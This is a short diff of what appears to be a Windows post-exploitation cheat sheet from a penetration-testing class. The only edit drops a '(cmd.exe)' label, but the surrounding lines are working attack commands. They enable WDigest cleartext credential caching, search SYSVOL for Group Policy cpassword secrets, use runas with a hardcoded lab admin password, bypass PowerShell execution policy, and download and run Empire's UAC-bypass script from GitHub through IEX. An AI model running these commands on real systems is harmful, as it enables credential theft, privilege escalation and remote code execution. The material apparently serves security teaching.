@@ -16,7 +16,7 @@ tasklist /SVC
 netstat -ano
 reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
 findstr /S cpassword $env:logonserver\sysvol\*.xml
-findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
+findstr /S cpassword %logonserver%\sysvol\*.xml
 runas /user:LABS\itadmin /password:APTClass! /noprofile powershell.exe
 powershell -ep bypass
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1')
